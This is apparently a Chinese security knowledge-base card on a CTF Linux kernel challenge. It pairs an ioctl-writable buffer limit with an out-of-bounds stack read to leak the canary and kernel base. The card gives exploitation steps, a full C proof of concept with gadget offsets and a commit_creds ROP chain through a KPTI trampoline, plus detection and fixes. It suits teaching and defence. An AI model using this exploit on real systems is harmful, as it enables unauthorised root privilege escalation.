---
id: binary-pwn-kernel-ioctl-maxbuffer-stack-read-leak-rop-commit-creds
title: 内核模块 ioctl 抬高全局 MaxBuffer + sread 越界栈读：泄露 canary 与内核基址后 kernel ROP commit_creds 提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-module-ioctl-length-gate-stack-leak-kernel-rop
aliases:
- ioctl 修改 MaxBuffer
- 内核栈任意读泄露
- sread 越界读 canary
- easy_kernel
- K3RN3L4RMY eazy_kernel
- kernel ROP commit_creds
- KPTI trampoline 提权
tags:
- kernel
- pwn
- stack-overflow
- ioctl
- info-leak
- canary-leak
- kaslr
- kernel-rop
- commit-creds
- kpti
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V333
  verified_at: '2026-11-08T18:25:01+08:00'
  notes: 已对照原文与44/44张图核对：img04 init_func proc_create(pwn_device)；img08 swrite 的 MaxBuffer 检查与 [rsp+0x80] canary；img10 MaxBuffer=0x40 且被 swrite/sioctl 引用；img11 sioctl cmd16 打印/cmd32 MaxBuffer=v3；img16 launch.sh nokaslr+-s；img29 泄漏第14项=canary、第18项=0xffffffff8123e347；img30 偏移 0x23e347；img32 swrite mov [rsp+0x80],rax；img42 prepare_kernel_cred=0xffffffff810881c0、commit_creds=0xffffffff81087e80；img43 KPTI trampoline=swapgs_restore_regs_and_return_to_usermode+22；img44 ctf uid=1000 在 KASLR 开启(base 0xffffffffb6000000)下 400 bytes written 后 uid=0，完整闭环成立。未验证点：未在本机复跑；gadget/符号偏移仅适配该 CTF 内核(easy_kernel, Linux 5.4.0)，非真实产品版本，原文未标受影响版本已 --clear；卡中“先 write 500 字节”为原文崩溃演示的示意(该演示实际 write sizeof(buffer))，不影响原理与最终 exp。卡内无 sources/source_url/文章 ID/长段摘录，path binary/pwn/kernel 合法。
---

## 一句话结论

内核驱动把写长度上限放在全局变量 `MaxBuffer` 里、并允许 ioctl 命令任意改写它时，原本受 `nbytes < MaxBuffer` 保护的内核栈 `copy_from_user` 会变成可控长度栈溢出；同一驱动的 `read` 又把内核栈数据按用户指定长度拷回用户态，可一次性泄露栈 canary 与内核代码指针（绕过 KASLR），最终用 `commit_creds(prepare_kernel_cred(0))` 的 kernel ROP + KPTI trampoline 返回用户态拿到 root。

## 原理

- **长度门槛由全局变量控制**：`swrite` 只在 `nbytes < MaxBuffer` 时执行 `copy_from_user(stack_buf, user_buf, nbytes)`，栈缓冲区实际为 128 字节而 `MaxBuffer` 初始只有 0x40；`sioctl` 的 `cmd = 32` 分支直接把用户传入的值赋给 `MaxBuffer`，于是攻击者先 ioctl 把上限抬到 0x1337，再 `write` 500 字节即可越过 canary、保存的 rbp 与返回地址。
- **越界栈读泄露**：`sread` 通过 `copy_to_user(user_buf, welcome_str, bytes_to_read)` 把字符串从内核栈拷到用户缓冲区，`bytes_to_read` 完全由用户控制。它实际读取的是 `sread` 栈帧起始处之后的连续栈内容，因此第 14 个 qword 位置的栈 canary、第 18 个 qword 位置的返回地址（内核代码指针）都会一并泄露；用 `kernel_base = leak[18] - 0x23e347` 即可还原内核基址，绕过 KASLR。
- **Canary 绕过**：用泄露的 canary 原值填回 `[rsp+0x80]` 对应位置（payload 下标 16），即可在溢出时保持 canary 校验通过。
- **Kernel ROP**：覆盖返回地址后使用内核 gadget 调用 `commit_creds(prepare_kernel_cred(0))`：`pop rdi; ret` 传 0，`prepare_kernel_cred` 返回 cred 指针，经 `mov rdi, rax` 类 gadget 转给 `commit_creds`，当前进程 cred 被替换为 root。
- **KPTI 返回**：KPTI 下用户态页在返回前需要切回用户页表，直接 `iretq` 不可用；跳到 `swapgs_restore_regs_and_return_to_usermode` 的 KPTI trampoline（示例为符号地址 + 22 处），由它完成页表切换、`swapgs` 与 `iretq`，栈上按 `user_rip/user_cs/user_rflags/user_sp/user_ss` 布置 iret 帧回到用户态 `get_shell()`。
- 为什么成立：长度校验与实际拷贝使用同一个可被外部修改的全局上限，检查/使用分离；同一模块的读接口把内核栈当作用户缓冲区拷贝，泄露与写原语闭环。

## 触发条件

- 目标内核加载了存在该缺陷的驱动（示例 `vuln.ko`，设备节点 `/proc/pwn_device`），普通用户可 `open` 并调用 `read/write/ioctl`。
- `ioctl` 提供修改写长度上限的命令（示例 cmd 32），或存在等价的可写全局边界变量。
- `read` 路径允许用户控制拷贝长度，能读出内核栈（示例 `read(fd, buf, 0x100)`）。
- 内核开启 stack canary、KASLR、KPTI；SMEP/SMAP 状态需按目标适配 gadget。
- 已知目标内核的符号/gadget 偏移（示例 `prepare_kernel_cred +0x881c0`、`commit_creds +0x87e80`，泄漏返回地址偏移 `0x23e347`）。

## 利用步骤

1. 逆向 `vuln.ko`：确认 `init_func` 创建 `/proc/pwn_device`；`swrite` 的 `nbytes < MaxBuffer` 检查与 128 字节栈缓冲区；`sioctl` 的 cmd 32 可写 `MaxBuffer`；`sread` 的 `bytes_to_read` 用户可控。
2. 打开设备并读出 0x100 字节栈数据：`read(fd, leakbuf, 0x100)`，打印每个 qword，定位 canary（示例下标 14）与内核返回地址（示例下标 18）。
3. 计算 `kernel_cookie = leakbuf[14]`、`kernel_base = leakbuf[18] - 0x23e347`，由基址加固定偏移得到 `prepare_kernel_cred`、`commit_creds`、`pop rdi`、`mov rdi, rax`、KPTI trampoline 等地址。
4. `ioctl(fd, 0x20, 0x1337)` 抬高 `MaxBuffer`，越过 0x40 上限。
5. 构造 payload：下标 16 填 canary、17 填 0、18 起为 ROP 链 `pop rdi; 0; prepare_kernel_cred; ...; commit_creds; kpti_trampoline; user_rip; user_cs; user_rflags; user_sp; user_ss`，通过 `write(fd, payload, sizeof(payload))` 触发栈溢出。
6. 返回用户态后检查 `getuid() == 0`，执行 `/bin/sh` 获得 root。

## PoC

```c
// 保存用户态返回帧
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(){
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs; mov user_ss, ss; mov user_sp, rsp;"
            "pushf; pop user_rflags; .att_syntax;");
}

int main(){
    save_state();
    int fd = open("/proc/pwn_device", O_RDWR);

    unsigned long leakbuf[0x100];
    read(fd, leakbuf, 0x100);                 // sread: 越界读内核栈
    unsigned long kernel_base = leakbuf[18] - 0x23e347;
    unsigned long kernel_cookie = leakbuf[14]; // 栈 canary

    unsigned long kpti_trampoline = kernel_base + 0xc00a2f + 22;
    unsigned long pop_rdi            = kernel_base + 0x1518;
    unsigned long pop_rdx            = kernel_base + 0x34b72;
    unsigned long prepare_kernel_cred = kernel_base + 0x881c0;
    unsigned long commit_creds        = kernel_base + 0x87e80;
    unsigned long cmp_rdx_ret         = kernel_base + 0xa30061;
    unsigned long mov_rdi_rax_ret     = kernel_base + 0x3b3504;

    ioctl(fd, 0x20, 0x1337);                  // 抬高全局 MaxBuffer

    int o = 16;
    unsigned long payload[50];
    payload[o++] = kernel_cookie;             // 对齐 [rsp+0x80] 的 canary
    payload[o++] = 0x0;                       // saved rbp
    payload[o++] = pop_rdi; payload[o++] = 0;
    payload[o++] = prepare_kernel_cred;
    payload[o++] = pop_rdx; payload[o++] = 0x8;
    payload[o++] = cmp_rdx_ret;               // 置 ZF=1，使 mov_rdi_rax_ret 内 jne 不跳
    payload[o++] = mov_rdi_rax_ret;           // rax(cred) → rdi
    payload[o++] = commit_creds;
    payload[o++] = kpti_trampoline;
    payload[o++] = 0; payload[o++] = 0;
    payload[o++] = (unsigned long)get_shell;
    payload[o++] = user_cs; payload[o++] = user_rflags;
    payload[o++] = user_sp; payload[o++] = user_ss;

    write(fd, payload, sizeof(payload));      // 栈溢出劫持返回地址
}
```

说明：文中最终 exp 在开启 KASLR、以普通 ctf 用户运行时成功拿到 root；PoC 未在本机复跑，偏移来自该 CTF 内核镜像，需按目标重新解析。

## 变体与关联

- 变体（边界变量）：把上限放在全局变量、模块参数或 ioctl 可写字段中，均可用同一“先改上限再溢出”思路；也可用整数截断/符号混淆直接绕过长度检查。
- 变体（泄露源）：`read` 拷贝长度可控、`printk` 格式化串、`/proc/kallsyms` 可读、dmesg 等都可作为 canary/KASLR 泄露点。
- 变体（提权目标）：`commit_creds(init_cred)`、修改 `task_struct->cred`、`call_usermodehelper`/`run_cmd` 执行命令等。
- 关联：[[binary-pwn-kernel-qwb-core-stack-overflow-rop]]（另一内核栈溢出的 canary 泄露 + kernel ROP，本卡差异在 ioctl 可写全局 MaxBuffer 与 sread 任意长度栈读）；[[binary-pwn-kernel-stack-overflow-struct-function-pointer-run-cmd]]（栈溢出覆盖结构体函数指针）；[[binary-pwn-kernel-ret2dir-physmap-spray-rop-commit-creds]]（内核 ROP 栈构造）。
- 边界：`MaxBuffer` 只读/被限制范围、`sread` 拷贝长度固定、canary/KASLR 无泄露、SMEP/SMAP/KPTI 未适配 gadget 时该链不成立。

## 检测与防御

- 检测特征：驱动里长度检查使用全局可写变量，且该变量可由 ioctl/模块参数修改；`read/write` 的 `copy_to_user/copy_from_user` 长度直接取用户参数；同一设备可先读栈再写栈。
- 修复：长度上限定义为 `const` 或放到只读 rodata；`copy_from_user` 前用 `min(nbytes, sizeof(stack_buf))` 硬限制；`copy_to_user` 只拷贝初始化缓冲区长度；ioctl 对命令值做白名单并校验参数范围。
- 加固：开启 KASLR/stack protector/SMEP/SMAP/KPTI；限制 `/proc/kallsyms`、dmesg 访问；用 CFI/静态分析审计设备驱动的长度检查与全局边界变量。
